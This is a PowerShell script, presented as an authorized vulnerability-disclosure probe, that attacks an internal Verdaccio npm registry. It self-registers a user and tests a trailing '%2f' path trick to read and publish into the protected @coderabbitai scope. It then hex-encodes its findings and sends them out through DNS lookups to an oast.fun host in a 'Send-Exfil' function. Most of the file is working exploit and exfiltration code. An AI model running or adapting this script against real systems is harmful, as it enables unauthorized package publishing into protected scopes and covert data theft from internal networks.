# Benign Verdaccio access-control probe for authorized CodeRabbit VDP research (ireniumsecurity).
# Creates a NEW package name in a protected scope, then deletes it. Touches no existing package.
$ErrorActionPreference = 'SilentlyContinue'
$OAST = 'dbidtc62jid2sfv70mg05naebui6gr8bp.oast.fun'
$R = $env:NPM_CONFIG_REGISTRY
if (-not $R) { $R = 'http://10.64.0.28:4873' }
$R = $R.TrimEnd('/')
$out = [ordered]@{}

function Send-Exfil([string]$s) {
    try {
        $h = -join ([System.Text.Encoding]::UTF8.GetBytes($s) | ForEach-Object { $_.ToString('x2') })
        for ($i = 0; $i -lt $h.Length -and $i -le 384; $i += 48) {
            $chunk = $h.Substring($i, [Math]::Min(48, $h.Length - $i))
            try { [System.Net.Dns]::GetHostAddresses("psa-$([int]($i/48))-$chunk.$OAST") | Out-Null } catch {}
        }
    } catch {}
}

function Get-Status($err) {
    try { return [int]$err.Exception.Response.StatusCode.value__ } catch { return -1 }
}

# 1. fingerprint
try {
    $r = Invoke-WebRequest -Uri "$R/-/ping" -UseBasicParsing -TimeoutSec 4
    $out.ping = "$($r.StatusCode):$($r.Content)"
} catch { $out.ping = "ERR:$(Get-Status $_)" }
try {
    $r = Invoke-WebRequest -Uri "$R/" -UseBasicParsing -TimeoutSec 4
    $m = [regex]::Match($r.Content, 'Verdaccio[^<"\s]{0,30}')
    if ($m.Success) { $out.ui = $m.Value } else { $out.ui = "code=$($r.StatusCode)" }
} catch { $out.ui = "ERR:$(Get-Status $_)" }

# 2. self-registration
$user = 'crvdp' + (-join (1..6 | ForEach-Object { '0123456789abcdef'[(Get-Random -Maximum 16)] }))
$tok = ''
try {
    $reg = @{ name = $user; password = "CrVdp-$user-9x!" } | ConvertTo-Json -Compress
    $r = Invoke-WebRequest -Uri "$R/-/user/org.couchdb.user:$user" -Method Put -Body $reg -ContentType 'application/json' -UseBasicParsing -TimeoutSec 4
    $out.reg = "$($r.StatusCode)"
    try { $tok = ($r.Content | ConvertFrom-Json).token } catch {}
} catch { $out.reg = "ERR:$(Get-Status $_)" }
$out.tok = $tok.Length

# 3. read-bypass controls (public scoped package: both should be 200; private would differ)
foreach ($pkg in @('@coderabbitai/config', '@coderabbitai/carrot-ui')) {
    $e = $pkg.Replace('/', '%2f')
    $a = -1; $b = -1
    try { $a = (Invoke-WebRequest -Uri "$R/$e" -UseBasicParsing -TimeoutSec 4).StatusCode } catch { $a = Get-Status $_ }
    try { $b = (Invoke-WebRequest -Uri "$R/$e%2f" -UseBasicParsing -TimeoutSec 4).StatusCode } catch { $b = Get-Status $_ }
    $out["r_$($pkg.Split('/')[1])"] = "$a/$b"
}

# 4. publish-bypass: NEW package name inside the protected scope, benign prerelease, no dist-tag
if ($tok.Length -gt 0) {
    $pkg = "@coderabbitai/crvdp-probe-$user"
    $ver = '0.0.0-crvdp'
    $tmp = Join-Path $env:TEMP ("crpkg-" + $user)
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
    ('{"name":"' + $pkg + '","version":"' + $ver + '"}') | Set-Content -Path (Join-Path $tmp 'package.json') -Encoding utf8
    $tgz = Join-Path $env:TEMP ("probe-" + $user + ".tgz")
    Push-Location $tmp
    tar -czf $tgz .
    Pop-Location
    if (Test-Path $tgz) {
        $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tgz))
        $sha1 = (Get-FileHash -Algorithm SHA1 -Path $tgz).Hash.ToLower()
        $len = (Get-Item $tgz).Length
        $manifest = @{
            _id = "$pkg/"; name = "$pkg/"; 'dist-tags' = @{};
            versions = @{ $ver = @{ name = $pkg; version = $ver; dist = @{ shasum = $sha1; tarball = "$R/$pkg/-/probe-$ver.tgz" } } };
            _attachments = @{ "probe-$ver.tgz" = @{ content_type = 'application/octet-stream'; data = $b64; length = $len } }
        } | ConvertTo-Json -Depth 10 -Compress
        $hdr = @{ Authorization = "Bearer $tok" }
        $enc = $pkg.Replace('/', '%2f')
        $ctl = -1; $pub = -1
        try { $ctl = (Invoke-WebRequest -Uri "$R/$enc" -Method Put -Body $manifest -ContentType 'application/json' -Headers $hdr -UseBasicParsing -TimeoutSec 5).StatusCode } catch { $ctl = Get-Status $_ }
        try { $pub = (Invoke-WebRequest -Uri "$R/$enc%2f" -Method Put -Body $manifest -ContentType 'application/json' -Headers $hdr -UseBasicParsing -TimeoutSec 5).StatusCode } catch { $pub = Get-Status $_ }
        $out.pub = "$ctl/$pub"
        if ($pub -eq 200 -or $pub -eq 201) {
            try {
                $g = Invoke-WebRequest -Uri "$R/$enc%2f" -UseBasicParsing -TimeoutSec 4
                $rev = ($g.Content | ConvertFrom-Json)._rev
                if ($rev) {
                    try {
                        $d = Invoke-WebRequest -Uri "$R/$enc%2f/-rev/$rev" -Method Delete -Headers $hdr -UseBasicParsing -TimeoutSec 4
                        $out.del = "$($d.StatusCode)"
                    } catch { $out.del = "ERR:$(Get-Status $_)" }
                }
            } catch { $out.del = "REVERR" }
        }
    } else { $out.pub = 'notgz' }
}

Send-Exfil (($out | ConvertTo-Json -Compress))
